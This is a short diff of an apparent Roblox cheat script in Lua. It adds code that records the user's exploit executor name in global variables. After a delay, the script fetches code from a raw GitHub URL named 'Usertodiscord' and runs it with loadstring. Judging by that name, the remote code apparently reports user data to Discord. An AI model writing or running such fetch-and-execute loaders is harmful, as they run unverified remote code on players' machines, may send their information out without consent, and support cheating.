@@ -11,6 +11,14 @@ local success, message = pcall(function()
     otherui1 = playerGui.spawn_units
 end)
 
+_G.whatmap = "This Player internet is slow."
+     _G.myexec = "Unknown Executor"
+     if getexecutorname then
+       _G.myexec = getexecutorname()
+        elseif identifyexecutor then
+       _G.myexec = identifyexecutor()
+     end
+
 task.spawn(function ()
 wait(5)
 loadstring(game:HttpGet("https://raw.githubusercontent.com/yClematiS/Main_Loader/main/Usertodiscord"))()
